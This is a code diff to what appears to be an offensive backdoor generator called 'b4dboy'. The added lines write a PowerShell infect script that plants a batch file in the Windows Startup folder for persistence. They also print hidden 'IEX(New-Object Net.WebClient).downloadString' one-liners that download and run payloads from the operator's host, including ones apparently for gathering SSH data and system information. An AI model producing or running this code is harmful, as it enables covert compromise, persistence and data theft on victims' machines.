@@ -28,6 +28,10 @@ def banner():
 
 # Commands
 def generate_bd():
+    # Payloads to server
+    os.system('cp payloads/win/* server/b4dboy/payloads/')
+    os.system('cp payloads/linux/* server/b4dboy/payloads/')
+
     args = action
     for arg in args:
         if "-p"  in arg or "--persistant": pers = True
@@ -43,11 +47,13 @@ def generate_bd():
                 if "/24" in value: break
             ip = value[9:][:15].split("/")[0].split(".")
 
+    port = r.randint(1000,65534)
+    outport = str(subprocess.check_call('netstat | grep {port} | wc -l', shell=True))[2:][:-1]
+    if int(outport) != 0: port = r.randint(10000, 65534)
+
     if osT == "windows" or osT == "win":
         
         system = "Windows"
-
-        port = r.randint(1000,65534)
         id=make_id()
         os.system(f'mkdir -p server/b4dboy/{id}')
         payload = payfile.get_payload(ip, port)    
@@ -59,7 +65,7 @@ def generate_bd():
         os.system(f'sudo cp payloads/win/converted.txt server/b4dboy/{id}') # Bb.bat / ejecuter on start
         with open(f"server/b4dboy/{id}/infect.ps1", "w") as ifc:
             ifc.write("cd $ENV:AppData\Microsoft\Windows\ ; cd 'Start Menu' ; cd Programs\Startup; wget http://"+ip[0]+"."+ip[1]+"."+ip[2]+"."+ip[3]+"/b4dboy/"+id+"/converted.txt -o Bb.bat")
-            ifc.write("\ncd $ENV:AppData\Microsoft\Windows\ ; cd 'Start Menu' ; cd Programs; curl.exe http://"+ip[0]+"."+ip[1]+"."+ip[2]+"."+ip[3]+"/b4dboy/"+id+"/evoke.txt > evoke.txt")
+            ifc.write("\ncd $ENV:AppData\Microsoft\Windows\ ; cd 'Start Menu' ; cd Programs; curl.exe http://"+ip[0]+"."+ip[1]+"."+ip[2]+"."+ip[3]+"/b4dboy/"+id+"/evoke.txt -o evoke.txt")
             ifc.write('\npowershell -W hidden -c "IEX(New-Object Net.WebClient).downloadString'+"('http://"+ip[0]+"."+ip[1]+"."+ip[2]+"."+ip[3]+"/b4dboy/"+id+"/temp.ps1'"+')"')
         ifc.close()
                 
@@ -79,7 +85,6 @@ def generate_bd():
     
     elif osT == "linux":
         system = "Linux"
-        port = r.randint(1000,65534)
         payload = ''
 
 def gen_pld():
@@ -94,7 +99,11 @@ def gen_pld():
             print('powershell -W hidden -c "'+"IEX(New-Object Net.WebClient).downloadString('http://"+ip[0]+"."+ip[1]+"."+ip[2]+"."+ip[3]+"/b4dboy/payloads/ip.ps1')"+'"')
         elif "-os" in arg:
             print('powershell -W hidden -c "'+"IEX(New-Object Net.WebClient).downloadString('http://"+ip[0]+"."+ip[1]+"."+ip[2]+"."+ip[3]+"/b4dboy/payloads/os.ps1')"+'"')
- 
+        elif "-ssh" in arg:
+            print('powershell -W hidden -c "'+"IEX(New-Object Net.WebClient).downloadString('http://"+ip[0]+"."+ip[1]+"."+ip[2]+"."+ip[3]+"/b4dboy/payloads/ssh.ps1')"+'"')
+        elif "-info" in arg:
+            print('powershell -W hidden -c "'+"IEX(New-Object Net.WebClient).downloadString('http://"+ip[0]+"."+ip[1]+"."+ip[2]+"."+ip[3]+"/b4dboy/payloads/info.ps1')"+'"')
+
 def mod_log():
     args = action
     for arg in args:
